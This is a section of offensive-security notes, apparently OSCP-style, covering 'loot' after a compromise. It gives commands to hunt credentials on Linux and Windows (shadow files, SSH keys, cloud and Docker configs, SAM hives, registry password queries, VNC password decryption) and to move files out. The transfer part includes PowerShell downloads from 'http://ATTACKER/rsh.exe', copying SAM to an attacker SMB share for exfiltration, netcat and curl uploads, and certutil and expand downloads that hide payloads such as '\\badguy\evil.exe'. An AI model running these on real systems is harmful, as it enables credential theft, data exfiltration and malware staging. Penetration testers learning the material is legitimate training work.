
# 7 Loot

## 7.1 Sensitive Files

The following are some files that have sensitive information that
are good to try to grab when you can (directory traversal, LFI, shell access).


### 7.1.1 Sensitive Files on Linux

Also check out [Linux Files of Interest](#6.5%20Linux%20Files%20of%20Interest).

```sh
/etc/passwd

# "shadow" files usually have credentials
find / -path '/usr' -prune -o -type f -readable \( -iname 'shadow*' -o -iname '.shadow*' \) -ls 2>/dev/null

# find ssh private keys (id_rsa, id_dsa, id_ecdsa, and id_ed25519)
find / -xdev -type f -readable -name 'id_*' -exec grep -q BEGIN {} \; -ls 2>/dev/null

# Wordpress config, can have credentials
find / -type f -readable -name wp-config.php -ls 2>/dev/null
# normally at:
/var/www/wordpress/wp-config.php

# look for other php config files that may have creds
find / -type f -readable -name '*config.php' -ls 2>/dev/null

# Apache htaccess files might indicate files/directories with sensitive info
find / -type f -readable -name .htaccess -ls 2>/dev/null

# mysql configs, can have creds
find / -type f -readable -name '*my.cnf' -ls 2>/dev/null

# find *_history files (bash, zsh, mysql, etc.), which may have sensitive info
find / -xdev -type f -readable -name '*_history' -ls 2>/dev/null

# AWS credentials
find / -xdev -type f -readable -path '*/.aws/*' \( -name credentials -o -name config \) -ls 2>/dev/null

# Docker config, has credentials
find / -xdev -type f -readable -path '*/.docker/*' -name config.json -ls 2>/dev/null

# GNUPG directory
find / -xdev -type d -readable -name '.gnupg' -ls 2>/dev/null

# Confluence config has credentials
find / -xdev -type f -readable -name confluence.cfg.xml -ls 2>/dev/null
# normally at:
/var/atlassian/application-data/confluence/confluence.cfg.xml

# VNC passwd files have creds
find / -xdev -type f -path '*/.*vnc/*' -name passwd -ls 2>/dev/null

# rarely, .profile files have sensitive info
find / -xdev -type f -readable -name '.*profile' -ls 2>/dev/null
```


### 7.1.2 Sensitive Files on Windows

Also check out:
- [Windows Passwords & Hashes](#5.8%20Windows%20Passwords%20&%20Hashes)
- [Windows Files of Interest](#5.11%20Windows%20Files%20of%20Interest)

```powershell
# SAM
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM

# Unattend install files: plaintext or base64 encoded password
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

# IIS, web.config can contain admin creds
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

# Groups.xml: encrypted password, but key is available online in many tools
C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml
\\????\SYSVOL\\Policies\????\MACHINE\Preferences\Groups\Groups.xml

# The 'cpassword' attribute found in many files
Services\Services.xml
ScheduledTasks\ScheduledTasks.xml
Printers\Printers.xml
Drives\Drives.xml
DataSources\DataSources.xml

# Windows Autologin credentials
reg query HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon

# SNMP credentials
reg query HKLM\SYSTEM\Current\ControlSet\Services\SNMP

# McAfee password stored in SiteList.xml
%AllUsersProfile%\Application Data\McAfee\Common Framework\SiteList.xml

# Putty proxy creds
reg query HKCU\Software\SimonTatham\PuTTY\Sessions

# UltraVNC encrypted password
dir /b /s *vnc.ini
C:\Program Files\UltraVNC\ultravnc.ini
# decrypt with:
# echo -n ULTRAVNC_PW_HASH | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
# or:
# https://github.com/trinitronx/vncpasswd.py
# or:
# msfconsole
# > irb
# > fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
# > require 'rex/proto/rfb'
# > Rex::Proto::RFB::Cipher.decrypt ["YOUR ENCRYPTED VNC PASSWORD HERE"].pack('H*'), fixedkey

# RealVNC hashed password in registry:
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver /v password

# TightVNC
reg query HKEY_CURRENT_USER\Software\TightVNC\Server /s
reg query HKLM\SOFTWARE\TightVNC\Server\ControlPassword /s
tightvnc.ini
vnc_viewer.ini

# TigerVNC
reg query HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4 /v password

# WinVNC3
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin credentials (32-bit and 64-bit versions)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /reg:64 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

# Search registry for password
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

More Windows IIS log and config paths [here](https://techcommunity.microsoft.com/t5/iis-support-blog/collect-basics-configuration-and-logs-when-troubleshooting-iis/ba-p/830927).



### 7.1.3 Sensitive Files - Generic

```powershell
*.kdbx # KeePass database
Get-ChildItem -Path C:\ -File -Recurse -ErrorAction SilentlyContinue -Include *.kdbx
```

#### 7.1.3.1 git repos

Sometimes git repos contain sensitive info in the git history.

```sh
# view commit history
git log

# show changes for a commit
git show COMMIT_HASH

# search for sensitive keywords in current checkout
git grep -i password

# search for sensitive keywords in file content of entire commit history
git grep -i password $(git rev-list --all)
```



## 7.2 File Transfers

**Great resource**: [HackTricks - Exfiltration](https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration) 🎉 🎉 🎉

### 7.2.1 Netcat transfer

```sh
# start listening for download on port 9001
nc -nlvp 9001 > dump.txt
# upload file to IP via port 9001
nc $IP 9001 < file.txt
```

### 7.2.2 Curl transfers

```sh
# upload a file with curl (POST multipart/form-data)
# replace key1, upload with appropriate form fields
curl -v -F key1=value1 -F upload=@localfilename URL
```

### 7.2.3 PHP File Uploads

Uploading files via HTTP POST to `upload.php`:

```php
<?php
// File: upload.php
// start php server from same directory as this file:
// mkdir -p ../uploads && sudo php -S 0.0.0.0:80
  $parentdir = dirname(dirname(__FILE__));
  $uploaddir = $parentdir . '/uploads/';
  $filename = basename($_FILES['file']['name']);
  $uploadfile = $uploaddir . $filename;
  move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

You could also make Apache run it instead of standing up your own php server.
Change the `$uploaddir` variable above to `'/var/www/uploads'`, and put the
`upload.php` script in `/var/www/cgi-bin`. Requests will then point to
`/cgi-bin/upload.php` instead of just `/upload.php`.

Starting Apache server on Kali with necessary directories:

```bash
# make upload directory
sudo mkdir -p /var/www/uploads
sudo chown -R www-data:www-data /var/www/uploads
# start server
sudo systemctl restart apache2
```

Uploading files from Windows using PowerShell:

```powershell
(New-Object System.Net.WebClient).UploadFile('http://LISTEN_IP/upload.php','somefiile')
```

Uploading files from Linux using curl:

```sh
curl -v http://LISTEN_IP/upload.php -F "file=@somefile"
```

If large files fail to upload properly, change the `php.ini` or `.user.ini` settings:

```sh
# on kali, find and edit file
locate php.ini
sudo vim /etc/php/7.4/apache2/php.ini
# in php.ini, change the following:
[php]
# disable php memory limit
memory_limit = -1
# make it 10GiB
upload_max_filesize = 10G
# make it unlimited
post_max_size = 0
# allow uploads to take 2 minutes
max_execution_time = 120
```

**Note:** The `.user.ini` file goes in your site’s document root.

### 7.2.4 PowerShell File Transfers

```powershell
# Download to Windows victim
invoke-webrequest -uri http://ATTACKER/rsh.exe -out c:\users\public\rsh.exe
# For PowerShell version < 3.0
(net.webclient).downloadstring("http://ATTACKER/shell.ps1") > c:\users\public\shell.ps1
(net.webclient).downloadfile("http://ATTACKER/shell.ps1", "c:\users\public\shell.ps1")

# uploading a file:
(New-Object System.Net.WebClient).UploadFile('http://LISTEN_IP/upload.php','somefiile')
```

### 7.2.5 Mount NFS Share

```sh
# try without vers=3 if mount fails. Also try with vers=2
mount -t nfs -o vers=3 REMOTE_IP:/home/ /mnt/nfs-share
```

### 7.2.6 SMB Share

Sharing entire `C:/` drive as SMB share for malicious user:
```bat
net share Cderp$=C:\ /grant:derp,FULL /unlimited
```

Mounting/hosting share on Kali
```sh
# mount foreign SMB share on Kali
sudo mount -t cifs -o vers=1.0 //REMOTE_IP/'Sharename' /mnt/smbshare

# host SMB share on kali (note: 'share' is share name)
sudo impacket-smbserver -smb2support share .
# to use for exfil: copy C:\Windows\Repair\SAM \\KALI_IP\share\sam.save

# To work with Windows 10+
impacket-smbserver -smb2support -user derp -password herpderp share .
# to connect on Windows with creds:
# net use \\ATTACKER_IP herpderp /user:derp
```

Using curl to upload file to windows SMB share
```sh
curl --upload-file /path/to/rsh.exe -u 'DOMAIN\username' smb://$VICTIM_IP/c$/
```

Get all files from SMB share with `smbclient`:
```sh
smbclient //$VICTIM_IP/SHARENAME
> RECURSE ON
> PROMPT OFF
> mget *
```

### 7.2.7 FTP Server on Kali

```sh
# install pyftpdlib for root to use port 21
sudo pip install pyftpdlib
# get usage help
python3 -m pyftpdlib --help
# start server on port 21, allowing anonymous write
sudo python3 -m pyftpdlib -p 21 -w
# start server on port 2121 for specific username/password
python3 -m pyftpdlib -w -u derp -P herpderp
```

Then on Windows box, create `ftpup.bat`:
```bat
@echo off
:: change server IP and Port as required
echo open LISTEN_IP 2121> ftpcmd.dat
echo user derp>> ftpcmd.dat
echo herpderp>> ftpcmd.dat
echo bin>> ftpcmd.dat
echo put %1>> ftpcmd.dat
echo quit>> ftpcmd.dat
ftp -n -s:ftpcmd.dat
del ftpcmd.dat
```

And use like so:

```bat
ftpup.bat filetotxfer.txt
```

Node.js ftps-server:
```sh
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:2121 --root /tmp
```

Pure-FTP server:
```sh
# Install
sudo apt update && sudo apt install -y pure-ftp
# Configure pure-ftp
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /usr/sbin/nologin ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```



### 7.2.8 WebDAV

We can host a WebDAV server on our Kali box for pushing/pulling files from other hosts, especially Windows machines using a Library file pointing to the WebDAV share.

```sh
# install wsgidav (WebDAV server)
pip3 install --user wsgidav

# make a folder that we want to host publicly
mkdir webdav

# start the server with open access
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav/
# you can confirm this is running by going to http://127.0.0.1 in your browser
```



### 7.2.9 SSHFS

To make things easier, set up a config file like so:

```
Host alpha
    HostName REMOTE_IP
    User root
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    IdentityFile /full/path/to/root_rsa
```

Then mount the filesystem with root access:

```sh
# format: sshfs [user@]host:[remote_directory] mountpoint [options]
sshfs -F/full/path/to/ssh-config alpha:/ ./rootfs
```

### 7.2.10 Windows LOLBAS File Downloads

```powershell
# Download 7zip binary to ./7zip.exe, using urlcache or verifyctl
certutil -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
certutil -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe

# Download using expand
expand http://7-zip.org/a/7z1604-x64.exe 7zip.exe
# Download from SBM share into Alternate Data Stream
expand \\badguy\evil.exe C:\Users\Public\somefile.txt:evil_ads.exe

# Download using powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://7-zip.org/a/7z1604-x64.exe','7zip.exe')"
powershell iwr -uri http://7-zip.org/a/7z1604-x64.exe -outfile 7zip.exe
```